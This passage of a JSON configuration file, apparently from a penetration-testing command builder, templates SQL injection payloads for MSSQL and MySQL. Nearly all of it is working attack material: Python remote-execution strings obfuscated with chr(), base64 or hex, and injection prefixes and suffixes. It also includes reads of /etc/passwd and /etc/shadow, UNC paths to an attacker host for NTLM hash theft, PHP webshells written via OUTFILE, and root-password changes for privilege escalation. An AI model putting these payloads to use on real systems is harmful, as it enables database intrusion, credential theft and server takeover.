              "label": "Choose the Quote Character"
            }
          },
          {
            "help": "Database names are used when queries details from the database. Often this is used after the database names are enumerated and then used to enumerate the table names for a given database.",
            "replace": "__MSSQL_DATABASE_NAME__",
            "defaultValue": "",
            "validationRegex": ".{1,}",
            "validationHelp": "Database Name must be at least 1 character",
            "props": {
              "type": "string",
              "label": "Name of Database to query"
            }
          },
          {
            "help": "Quick options for RCE commands to run with the Custom Option also available for total flexibility.",
            "replace": "__MSSQL_RCE_CMD__",
            "defaultValue": "whoami",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "whoami",
                  "label": "whoami"
                },
                {
                  "replace": "hostname",
                  "label": "hostname"
                },
                {
                  "replace": "systeminfo",
                  "label": "systeminfo"
                },
                {
                  "replace": "dir",
                  "label": "dir"
                },
                {
                  "replace": "ls",
                  "label": "ls"
                },
                {
                  "replace": "pwd",
                  "label": "pwd"
                },
                {
                  "replace": "echo %cd%",
                  "label": "Current working directory on Windows"
                },
                {
                  "replace": "__MSSQL_RCE_CUSTOM__",
                  "label": "Custom RCE Command"
                }
              ],
              "label": "RCE common command options"
            }
          },
          {
            "help": "",
            "replace": "__MSSQL_RCE_CUSTOM__",
            "defaultValue": "",
            "validationRegex": "",
            "validationHelp": "",
            "props": {
              "type": "string",
              "label": "Custom RCE command string"
            }
          },
          {
            "help": "MSSQL can have execution of Python and R code enabled. This allows for some nice RCE options as a pentester. This command shows how to use Python to run `system` commands on the server hosting this database.",
            "replace": "__MSSQL_PYTHON_CMD__",
            "defaultValue": "print(__import__(\"os\").system(\"__MSSQL_RCE_CMD__\"))",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "__MSSQL_RCE_CUSTOM__",
                  "label": "Custom RCE Command string"
                },
                {
                  "replace": "print(__import__(\"os\").system(\"__MSSQL_RCE_CMD__\"))",
                  "label": "import os module to run system command eg 'whoami'"
                },
                {
                  "replace": "print(__import__(chr(111)+chr(115)).system(chr(119)+chr(104)+chr(111)+chr(97)+chr(109)+chr(105)))",
                  "label": "chr() obfuscated import os execute system command 'whoami'"
                },
                {
                  "replace": "print(__import__(chr(111)+chr(115)).system(__import__(chr(98)+chr(97)+chr(115)+chr(101)+chr(54)+chr(52)).b64decode(\"__MSSQL_PYTHON_BASE64__\")))",
                  "label": "chr() obfuscated import os execute system command as BASE64 encoded string"
                },
                {
                  "replace": "print(__import__(chr(111)+chr(115)).system(bytes.fromhex(format(__MSSQL_RCE_HEX__, chr(120)))))",
                  "label": "chr() obfuscated import os execute system command formatted as HEXADECIMAL"
                }
              ],
              "label": "Python Script RCE options"
            }
          },
          {
            "help": "",
            "replace": "__MSSQL_PYTHON_BASE64__",
            "defaultValue": "",
            "validationRegex": "",
            "validationHelp": "",
            "props": {
              "type": "string",
              "label": "Custom Python code, base64 encoded"
            }
          }
        ]
      },
      {
        "win": 2,
        "label": "MYSQL injection",
        "platform": "linux",
        "terminal": ["sh", "bash"],
        "allowTerminalWrap": false,
        "allowProxychains": false,
        "cmd": "__MYSQL_STEP__",
        "help": "",
        "code": [],
        "config": [
          {
            "help": "Select an option that matches the type of sqli to attempt. Often this follows the stages of a pentest where the first tasks are to discover and enumerate any potential attacks before finally attempting the attacks. Be aware that running any of these commands on a production environment could come with undesirable side effects. Run at your own risk!",
            "replace": "__MYSQL_STEP__",
            "defaultValue": "__MYSQL_START_STATMENT____MYSQL_ENUMERATION_STATMENT____MYSQL_END_STATMENT__",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "__MYSQL_START_STATMENT____MYSQL_ENUMERATION_STATMENT____MYSQL_END_STATMENT__",
                  "label": "Discovery and Enumeration"
                },
                {
                  "replace": "__MYSQL_START_STATMENT____MYSQL_OFFENSIVE_STATMENT____MYSQL_END_STATMENT__",
                  "label": "Offensive payloads (eg RCE)"
                }
              ],
              "label": "Select Sqli Payload Type"
            }
          },
          {
            "help": "This is inserted at the BEGINNING of the payload, where necessary for the given command. Often this is the text `';` or any other context that escapes the existing query eg `' UNION SELECT ...`",
            "replace": "__MYSQL_START_STATMENT__",
            "defaultValue": "'; ",
            "props": {
              "type": "select",
              "label": "Statement to prepend to SQLi payload",
              "customInput": true,
              "options": ["'; ", "\"; ", "' UNION ", "' UNION SELECT "]
            }
          },
          {
            "help": "The statement to append to the END of the Sqli payload. Often this is a comment to stop the rest of the parent sql statement from running eg `; -- #`",
            "replace": "__MYSQL_END_STATMENT__",
            "defaultValue": "-- // ",
            "props": {
              "type": "select",
              "label": "Statement to append to SQLi payload",
              "customInput": true,
              "options": ["-- // ", "# //", "; -- #", "; # --"]
            }
          },
          {
            "help": "# Discovery and Enumeration in Sqli\n\nDiscover and Enumeration are very helpful to gather enough insight for further steps. Knowing what version or type of the database can help narrow in on version-specific exploits. Further, knowing the permissions and other details is also very helpful. These command options attempt to help construct the queries necessary quickly, while allowing enough flexibility to adapt to the current environment.\n\n## Ultimate Sqli Payload for Mysql\n\n[Ultimate Sqli Payload for Mysql Info](https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/)\n\nThis may be helpful to determine IF mysql injection is possible. Tho, it might not make it very clear how to proceed with the vulnerability.",
            "replace": "__MYSQL_ENUMERATION_STATMENT__",
            "defaultValue": "select version()",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "select version()",
                  "label": "select version"
                },
                {
                  "replace": "select database()",
                  "label": "select database name"
                },
                {
                  "replace": "select concat(__MYSQL_QUOTE__x__MYSQL_QUOTE__,__MYSQL_QUOTE__y__MYSQL_QUOTE__)",
                  "label": "confirm db is mysql via concat() - prints xy"
                },
                {
                  "replace": "select concat(char(65), char(66))",
                  "label": "confirm mysql via concat without quotes - uses char() - prints AB"
                },
                {
                  "replace": "select user()",
                  "label": "select user"
                },
                {
                  "replace": "select system_user()",
                  "label": "see who can modify other mysql users"
                },
                {
                  "replace": "select @@datadir",
                  "label": "select the data filesystem directory path"
                },
                {
                  "replace": "SELECT * FROM some_table WHERE double_quotes = \"IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\"*/\"",
                  "label": "Ultimate SQL Injection Payload (see link in help for details)"
                },
                {
                  "replace": "select user from mysql.user where file_priv=__MYSQL_QUOTE__Y__MYSQL_QUOTE__",
                  "label": "select users with file privs (potential RCE or file reading)"
                },
                {
                  "replace": "SELECT table_name FROM __MYSQL_SCHEMA_TABLES__ WHERE table_schema=__MYSQL_QUOTE____MYSQL_DATABASE_NAME____MYSQL_QUOTE__",
                  "label": "select table names of a given database"
                },
                {
                  "replace": "select @@innodb_version",
                  "label": "select innodb version"
                },
                {
                  "replace": "SELECT column_name FROM information_schema.columns WHERE table_name=__MYSQL_QUOTE____MYSQL_TABLE_NAME____MYSQL_QUOTE__",
                  "label": "get column names for a given table"
                },
                {
                  "replace": "select @@secure_file_priv",
                  "label": "select the secure file path priv"
                },
                {
                  "replace": "select @@global.secure_file_priv",
                  "label": "select the global secure file priv"
                },
                {
                  "replace": "select user,Super_priv from mysql.user where Super_priv=__MYSQL_QUOTE__Y__MYSQL_QUOTE__",
                  "label": "select users with super priv"
                },
                {
                  "replace": "SELECT routine_name FROM information_schema.routines WHERE routine_type = __MYSQL_QUOTE__FUNCTION__MYSQL_QUOTE__",
                  "label": "select all functions defined in database"
                },
                {
                  "replace": "SELECT routine_name FROM information_schema.routines WHERE routine_type = __MYSQL_QUOTE__FUNCTION__MYSQL_QUOTE__ AND routine_schema!=__MYSQL_QUOTE__sys__MYSQL_QUOTE__",
                  "label": "select all custom functions in database (excludes sys)"
                }
              ],
              "label": "Enumeration Options"
            }
          },
          {
            "help": "Offensive payloads include attempting tasks like RCE. Use at your own risk\n\nPotential tasks include:\n\n1. Reading files from the host computer filesystem which is running this database instance\n2. Attempting to steal NTLM hashes or perform SMB relay attacks via reading/writing to UNC Paths (this is only possible on Windows hosts)\n3. Writing payloads to the host computer filesystem - including webshells or other malicious file contents (eg, plugins for the database to load)",
            "replace": "__MYSQL_OFFENSIVE_STATMENT__",
            "defaultValue": "select load_file(__MYSQL_QUOTE____MYSQL_FILE_READ_PATH____MYSQL_QUOTE__)",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "select load_file(__MYSQL_QUOTE____MYSQL_FILE_READ_PATH____MYSQL_QUOTE__)",
                  "label": "read a file via load_file"
                },
                {
                  "replace": "select __MYSQL_FILE_WRITE_CONTENTS__ into __MYSQL_WRITE_FILE_FUNCTION__ __MYSQL_QUOTE____MYSQL_FILE_WRITE_PATH____MYSQL_QUOTE__",
                  "label": "create a file (eg webshell) via OUTFILE or DUMPFILE"
                },
                {
                  "replace": "__MYSQL_CHANGE_PASSWORD_STEP__",
                  "label": "change Mysql root password"
                },
                {
                  "replace": "__MYSQL_LOAD_INFILE_STEP__",
                  "label": "read a file from the local filesystem or on Windows from a UNC path"
                }
              ],
              "label": "Offensive Sqli payloads"
            }
          },
          {
            "help": "",
            "replace": "__MYSQL_WRITE_FILE_FUNCTION__",
            "defaultValue": "outfile",
            "props": {
              "type": "select",
              "label": "Choose the mysql function to create the file",
              "customInput": false,
              "options": ["outfile", "dumpfile"]
            }
          },
          {
            "help": "To create a webshell, often the contents will be a simple PHP or ASPX shell. Search for `webshell` to find more payloads beyond the ones provided here. Also, see the `webshell` commands for how to call these payloads with tools like `curl`\n\nThis can also be a value such as the database version `@@version` which might allow for ex-filtration of information via a UNC path on Windows hosts.\n\nCustom input is enabled for maximum flexibility\n",
            "replace": "__MYSQL_FILE_WRITE_CONTENTS__",
            "defaultValue": "__MYSQL_QUOTE__<?php system($_GET[0]);?>__MYSQL_QUOTE__",
            "props": {
              "type": "select",
              "label": "Contents to write into the file",
              "customInput": true,
              "options": [
                "__MYSQL_QUOTE__<?php system($_GET[0]);?>__MYSQL_QUOTE__",
                "@@version",
                "__MYSQL_QUOTE__<?php echo passthru($_GET[0]);?>__MYSQL_QUOTE__",
                "__MYSQL_QUOTE__<?php system(base64_decode($_GET[0]));?>__MYSQL_QUOTE__"
              ]
            }
          },
          {
            "help": "Often times when creating a webshell or other payload for a webserver common paths like `/var/www/html/shell.php` are used. See the `webshell` commands for more info and insight to these",
            "replace": "__MYSQL_FILE_WRITE_PATH__",
            "defaultValue": "",
            "validationRegex": ".{1,}",
            "validationHelp": "Path must be at least one character",
            "props": {
              "type": "string",
              "label": "File-system path where contents are written"
            }
          },
          {
            "help": "When Mysql is run as a high privilege user, it's possible to read files from the filesystem to aid in privilege escalation or to gain a better foothold on the system. Pair this attack with previous knowledge for better results. Consider trying to read `ssh keys`, `/etc/passwd`, `/etc/shadow` and other sensitive files!\n\n> NOTE: on Windows, this could be a UNC Path to attempt to perform NTLM Hash theft or an SMB Relay attack",
            "replace": "__MYSQL_FILE_READ_PATH__",
            "defaultValue": "//__ATTACKER_HOST__/share/test.txt",
            "props": {
              "type": "select",
              "label": "File-system path to read contents of",
              "customInput": true,
              "options": [
                "//__ATTACKER_HOST__/share/test.txt",
                "\\\\\\\\__ATTACKER_HOST__\\\\share\\\\test.txt",
                "__MYSQL_FILE_WRITE_PATH__",
                "/var/www/html/index.html",
                "/etc/passwd",
                "/etc/shadow",
                "/etc/hosts"
              ]
            }
          },
          {
            "help": "",
            "replace": "__MYSQL_LOAD_INFILE_STEP__",
            "defaultValue": "create table __MYSQL_TABLE_NAME__(line text)",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "create table __MYSQL_TABLE_NAME__(line text)",
                  "label": "Step 0: Create table (possibly optional)"
                },
                {
                  "replace": "load data __MYSQL_ENABLE_LOCAL_INFILE__infile __MYSQL_QUOTE____MYSQL_FILE_WRITE_PATH____MYSQL_QUOTE__ into table __MYSQL_TABLE_NAME__ FIELDS TERMINATED BY __MYSQL_QUOTE__\\n__MYSQL_QUOTE__",
                  "label": "Step 1: load data into table"
                },
                {
                  "replace": "select line from __MYSQL_TABLE_NAME__",
                  "label": "Step 2: read contents of table"
                }
              ],
              "label": "Reading file contents (using a table) steps"
            }
          },
          {
            "help": "",
            "replace": "__MYSQL_CHANGE_PASSWORD_STEP__",
            "defaultValue": "UPDATE mysql.user SET Password=PASSWORD(__MYSQL_QUOTE____MYSQL_NEW_PASSWORD____MYSQL_QUOTE__) WHERE User=__MYSQL_QUOTE__root__MYSQL_QUOTE__",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "UPDATE mysql.user SET Password=PASSWORD(__MYSQL_QUOTE____MYSQL_NEW_PASSWORD____MYSQL_QUOTE__) WHERE User=__MYSQL_QUOTE__root__MYSQL_QUOTE__",
                  "label": "Step 1: Update password (variant 1)"
                },
                {
                  "replace": "UPDATE mysql.user SET authentication_string=PASSWORD(__MYSQL_QUOTE____MYSQL_NEW_PASSWORD____MYSQL_QUOTE__) WHERE User=__MYSQL_QUOTE__root__MYSQL_QUOTE__",
                  "label": "Step 1: Update password (variant 2)"
                },
                {
                  "replace": "FLUSH PRIVILEGES",
                  "label": "Step 2: Flush privs"
                },
                {
                  "replace": "mysql -h __MYSQL_HOSTNAME__ -u root -p __MYSQL_NEW_PASSWORD__",
                  "label": "Step 3: login to mysql on commandline"
                }
              ],
              "label": "Change Mysql Root User Password for Privesc"
            }
          },
          {
            "help": "",
            "replace": "__MYSQL_NEW_PASSWORD__",
            "defaultValue": "thenewpasswordstring",
            "validationRegex": "",
            "validationHelp": "",
            "props": {
              "type": "string",
              "label": "New Password"
            }
          },
          {
            "help": "",
            "replace": "__MYSQL_HOSTNAME__",
            "defaultValue": "__TARGET_HOST__",
            "props": {
              "type": "select",
              "label": "Mysql Hostname or IPv4 address",
              "customInput": true,
              "options": ["__TARGET_HOST__"]
            }
          },
          {
            "help": "",
            "replace": "__MYSQL_QUOTE__",
            "defaultValue": "'",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "'",
                  "label": "Single Quote (')"
                },
                {
                  "replace": "\"",
                  "label": "Double Quote (\")"
                }
              ],
              "label": "Select a quote character"
            }
          },
          {
            "help": "",
            "replace": "__MYSQL_SCHEMA_TABLES__",
            "defaultValue": "information_schema.tables",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "information_schema.tables",
                  "label": "Information_schema.tables (supported by older mysql versions)"
                },
                {
                  "replace": "mysql.innodb_table_stats",
                  "label": "mysql.innodb_table_stats (supported by 'modern' mysql versions)"
                }
              ],
              "label": "Select from database option for getting table info"
            }
          },
          {
            "help": "",
            "replace": "__MYSQL_DATABASE_NAME__",
            "defaultValue": "",
            "validationRegex": ".{1,}",
            "validationHelp": "Database name must be at least one character",
            "props": {
              "type": "string",
              "label": "The database name to select from"
            }
          },
          {
            "help": "",
            "replace": "__MYSQL_TABLE_NAME__",
            "defaultValue": "",
            "validationRegex": ".{1,}",
            "validationHelp": "Table name must be at least one character",
            "props": {
              "type": "string",
              "label": "Enter the name of the table (used for selecting or creating)"
            }
          }
        ]
      }
    ]
  }
]
